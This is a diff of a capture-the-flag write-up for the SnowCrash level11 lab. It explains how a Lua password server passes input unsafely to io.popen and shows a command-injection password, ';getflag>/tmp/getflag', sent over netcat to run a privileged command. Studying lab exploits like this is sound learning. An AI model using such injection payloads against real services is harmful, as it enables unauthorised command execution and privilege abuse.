@@ -43,14 +43,16 @@ while 1 do
 end
 ```
 
-TEXT
+The Lua script `level11.pl` is owned by `flag11`, with the SUID bit set `-rwsr-sr-x`, meaning it will run with the privileges of `flag11`.
 
-Breakdown the program:
-- Get a socket and bind to `127.0.0.1` localhost to the port `5151`.
-- Accept a new client, then ask for a password.
-- When receive the pass, send it to `hash()`
-- `hash()` take the pass in argument and send it to `sha1sum` via `io.popen()` with `echo "..pass.." | sha1sum` (`..pass..` stand for the arg `pass`). It's there where a vulnerability can be used.
-- Then compare the hash pass to `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0` and print a message depending on the result.
+Program breakdown:
+-A socket server binds to `127.0.0.1` on port `5151`.
+-When a client connects, it prompts for a password.
+-The password is passed to the `hash()` function, which executes `sha1sum` through `io.popen()` via the command `echo "..pass.." | sha1sum`.
+-The resulting SHA1 hash is compared to `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`.
+-A success or failure message is sent back to the client.
+
+The use of `io.popen("echo "..pass.." | sha1sum")` is unsafe. If the password contains shell metacharacters, arbitrary commands can be executed.
 
 ## 2. Communication With The Program
 
@@ -60,58 +62,63 @@ Password: test
 Erf nope..
 ```
 
-TEXT
+To communicate with the program, a client must connect to the server using `nc` (netcat) or any TCP client.
 
 **Explanation:**
->- `nc`				: 
->- `locahost`		: 
->- `5151`			: 
+>- `nc`				: netcat, a tool to read and write data across networks.
+>- `locahost`		: address of the local machine.
+>- `5151`			: port to listen to.
 
 
-## 3.FAUSSE PISTE
+## 3. Misleading Approach
 
-TEXT
-
+A seemingly good approach is to try reversing the hash:
 ```
 f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
 ```
 
-TEXT - [Dcode SHA1 decryptor](https://www.dcode.fr/hash-sha1)
-
+Using an online SHA1 reverse tool, such as [Dcode SHA1 decryptor](https://www.dcode.fr/hash-sha1), the hash can be reversed to:
 ```
 NotSoEasy
 ```
 
-TEXT
-
+However, submitting this password to the server does not work:
 ```bash
 level11@SnowCrash:~$ nc localhost 5151
 Password: NotSoEasy
 Erf nope..
 ```
 
-**Explanation:**
->- `nc`				: 
->- `locahost`		: 
->- `5151`			: 
+Therefore, a different method must be employed to retrieve the token.
 
-## 4. Shell Injection 
+**Explanation:**
+>- `nc`				: netcat, a tool to read and write data across networks.
+>- `locahost`		: address of the local machine.
+>- `5151`			: port to listen to.
+
+## 4. Exploiting Shell Injection
 
 ```bash
 level11@SnowCrash:~$ nc localhost 5151
-Password: &getflag>/tmp/getflag
+Password: ;getflag>/tmp/getflag
 Erf nope..
 level11@SnowCrash:~$ cat /tmp/getflag
 Check flag.Here is your token : XXX
 ```
 
-**Explanation of the injection:**
->- `&`					: 
->- `getflag`			: 
->- `>/tmp/getflag`		: 
+The `io.popen("echo "..pass.." | sha1sum")` call executes a shell command that concatenates the password into the `echo` command. Allowing injection of arbitrary commands.
 
+By proving the shell command `;getflag>/tmp/getflag` as password, the shell executes the `getflag` command with the privileges of the SUID binary (i.e., as `flag11`) and redirects the output to `/tmp/getflag`.
+
+**Explanation of the injection:**
+>- `;`					: ends the `echo` command in the shell and allows `getflag` to run.
+>- `getflag`			: executes the privileged command.
+>- `>/tmp/getflag`				: redirects the output of `getflag` to `/tmp/getflag`.
 
 **Explanation:**
->- `nc`				: 
->- `locahost`		: 
->- `5151`			: 
+>- `nc`				: netcat, a tool to read and write data across networks.
+>- `localhost`		: address of the local machine.
+>- `5151`			: port to listen to.
+>- `;`				: separates commands, ending the current one and starting a new one.
+>- `getflag`		: command to execute to get the flag.
+>- `> FILE`			: redirects the standard output of a command into `FILE`
